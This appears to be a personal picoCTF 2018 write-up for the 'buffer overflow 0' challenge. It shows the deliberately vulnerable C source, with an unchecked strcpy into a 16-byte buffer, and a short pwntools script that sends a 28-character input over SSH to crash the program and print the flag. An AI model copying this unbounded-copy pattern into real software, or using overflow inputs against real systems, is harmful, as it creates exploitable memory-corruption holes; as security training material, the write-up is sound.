# Binary Exploitation

### **buffer overflow 0 - Points: 150**

> Let's start off simple, can you overflow the right buffer in this [program](https://2018shell.picoctf.com/static/bacf5fae929ccfce6eacdc51cfad3031/vuln) to get the flag? You can also find it in /problems/buffer-overflow-0\_3\_d5263c5219b334339c34ac35c51c4a17 on the shell server. [Source](https://2018shell.picoctf.com/static/bacf5fae929ccfce6eacdc51cfad3031/vuln.c).  
> Hint:   
> How can you trigger the flag to print?  
> If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

vuln.c contents:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[16];  strcpy(buf, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  if (argc > 1) {    vuln(argv[1]);
    printf("Thanks! Received: %s", argv[1]);
  }  else
    printf("This program takes 1 argument.\n");
  return 0;}
```

One way was to run the program and pass a really long \(supposedly at least 28 bytes\) string and it will print the flag on the server. Another method I wanted to use was pwntool because it gave me an opportunity to learn about the this popular program.

```c
from pwn import *

username = "tokumeipoh"

input = 'a' * 28

connection = ssh(host="2018shell.picoctf.com", user=username, password="{password}")

py = connection.run("cd /problems/buffer-overflow-0_3_d5263c5219b334339c34ac35c51c4a17; ./vuln {}".format(input))

print(py.recv())
connection.close()
```
